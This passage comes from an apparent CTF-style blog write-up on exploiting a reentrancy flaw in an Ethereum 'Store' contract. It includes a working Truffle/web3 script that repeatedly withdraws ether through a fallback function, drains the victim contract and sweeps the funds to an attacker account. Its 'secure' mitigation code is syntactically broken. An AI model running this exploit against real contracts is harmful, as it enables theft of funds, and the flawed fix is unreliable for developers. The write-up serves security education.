from the previous that fallback function can be run when there is a  function invoked without funtion id signature known , but also can be exectued when the designated contract revecive plain ethers. so when our malicious contract withdraw `1 ether` and revcived it .it will make fallback function run again
which it their logic to withdraw another 1 ether and still that proccess run again over again until the victim contract got drained. then we make another function to transfer all the fund the exist in our bad contract and set modifier so can't let another badboy steal our money el haram and be a real badboys :D (⌐■-■)


let's our malicious contract and then write exploit that will make the same logic we have made above but in a malicious way.

> first we will make our malicious smart contract to donate `1 ether` so we  bypass first check in withdraw function
> then our contract when receives the plain ether will make fallback function run automatically over and over again upon each ether our contract has received.

# exploit

```javascript
const StoreContract   = artifacts.require('Store');
const ExploitContract = artifacts.require('Exploit'); 


const YELLOW = "\033[93m"
const GREEN  = "\033[32m"
const Blue   = "\033[34m"
const Red    = "\033[31m"


async function execute(callback) {
    
    console.log( Blue + '[*] start running the exploit')
    let vulnerableContract = await StoreContract.deployed();
    console.log(`[+] Vulnerable contract address is : ${vulnerableContract.address}`);
    
    let owner = web3.eth.accounts[0]
    console.log(`[+] owner address is ${owner}`)


    let OwnerBalance = await web3.fromWei(await web3.eth.getBalance(owner) , 'ether')
    console.log(`[+] Owner balance is : ${OwnerBalance}`)


    victimContractInitialBalance = web3.fromWei(await web3.eth.getBalance(vulnerableContract.address), 'ether')
    console.log(`[+] Initial victim's contract balance: ${victimContractInitialBalance} eth`)    

    //deploy our malicious contract
    
    console.log( YELLOW + '[+] deploy our malicious contract')

    let AttackingContract = await ExploitContract.deployed();
    let badBoy = await AttackingContract.attacker.call()
    console.log(`[+] badboy address is ${badBoy}`)


    console.log(`[+] badBoy contract address is : ${AttackingContract.address}`)

    
    let AttackerBalance = web3.fromWei(await web3.eth.getBalance(badBoy) , 'ether' )
    console.log("[+] badBoy account balance is :" + AttackerBalance)

 

    console.log( GREEN + '[+] make a small donation from our malicious contract')

    await vulnerableContract.donate(AttackingContract.address , {
        from: badBoy,
        value: web3.toWei(1, 'ether')

    })


    let AttackerContractDonation = await vulnerableContract.balanceOf(AttackingContract.address);

    console.log(`[+] Donation Attacker\'s contract value is : ${web3.fromWei(AttackerContractDonation , 'ether')}`)


    let victimContractBalance = web3.fromWei(await web3.eth.getBalance(vulnerableContract.address) , 'ether' )

    console.log(`[+] victim contract balance now ${victimContractBalance} ether`)

    console.log( Red + '[+] Start Attacking the target')

    await AttackingContract.Hack(web3.toWei(1, 'ether') , {
        from: badBoy,
    })

    console.log('[+] check remote contract funding',web3.fromWei(await web3.eth.getBalance(vulnerableContract.address).toNumber(), 'ether'))
    
    console.log('[+] check malicious contract funding',web3.fromWei(await web3.eth.getBalance(AttackingContract.address).toNumber(), 'ether'))
    
    console.log( Red + '[+] transfer all the money to the badboy account')

    await AttackingContract.getMyMoney({
        from: badBoy
    })
    

    console.log(Blue + '[+] check badboy account balance now',web3.fromWei(await web3.eth.getBalance(badBoy).toNumber(), 'ether'))

    callback()
}

```

`then run in your terminal truffle exec your malicious script` then you will have to see results like this

![image](/assets/img/hackthebox/bitlab/result.png)


# Mitigation (best practice to write this code safly)

```javascript

  // insecure  
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  // secure  
   function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        //updating first caller balance before sending the money so in the second with not enough ether will revert
        balances[msg.sender] -= _amount;
      if(msg.sender.transfer(_amount)()) {
        _amount;
      }
      
    }
  }


```
as might you see above be prefer when want to send ether to user `send or trasnfer` as those as much safer than `call`
also have to updated the state variable before sending the money.


that's all about this writeup , Hope this artical be so useful to anyone want to learn about securing blockchain development and added values what you are looking for.

Stay tuned for upcoming posts there will be many amazing and cool stuffs I will write inshallah.


# Feedback Really Appreciate






